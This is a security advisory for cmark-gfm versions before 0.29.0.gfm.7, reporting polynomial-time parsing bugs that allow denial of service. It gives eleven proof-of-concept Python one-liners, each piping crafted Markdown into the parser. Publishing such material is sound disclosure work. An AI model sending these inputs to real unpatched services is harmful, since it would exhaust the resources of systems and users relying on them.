# Quadratic complexity bugs may lead to a denial of service

Moderate

GHSA-29g3-96g3-jg6c
Jan 23, 2023

## Package

No package listed

## Affected versions

< 0.29.0.gfm.7

## Patched versions

0.29.0.gfm.7

## Description

### Impact

Several polynomial time complexity issues in cmark-gfm may lead to unbounded resource exhaustion and subsequent denial of service.

### Proof of concept

Each of the commands below triggers a different issue.

```
python3 -c 'print("-1" + "<?x"* 10000 + "y")' | cmark-gfm
python3 -c 'print("|-\nt>|-\n"* 10000)' | cmark-gfm -e table
python3 -c "n=10000; print('*t '*n + '_t*_ '*n)" | cmark-gfm
python3 -c 'print("x\n| - |\n" + "|"* 10000 + "y")' | cmark-gfm -e table
python3 -c 'print("z_www." * 10000)' | cmark-gfm -e autolink
python3 -c 'print("[f]:u\n\"\n" + "[f]\n" * 10000 + "[f]:u \"t\n")' | cmark-gfm
python3 -c 'print("www." + ")" * 10000)' | cmark-gfm -e autolink
python3 -c 'print(":-\n" + ":\n" * 10000 + ":-\n")' | cmark-gfm -e table
python3 -c 'print("<http://s" * 10000)' | cmark-gfm -e autolink
python3 -c 'print("~e" + ",z~~" * 10000)' | cmark-gfm -e strikethrough
python3 -c 'print(">" * 10000 + "." * 10000)' | cmark-gfm
```

Increasing the number 10000 in the above commands causes the running time to increase quadratically.

### Patches

These vulnerabilities have been patched in `0.29.0.gfm.7`.
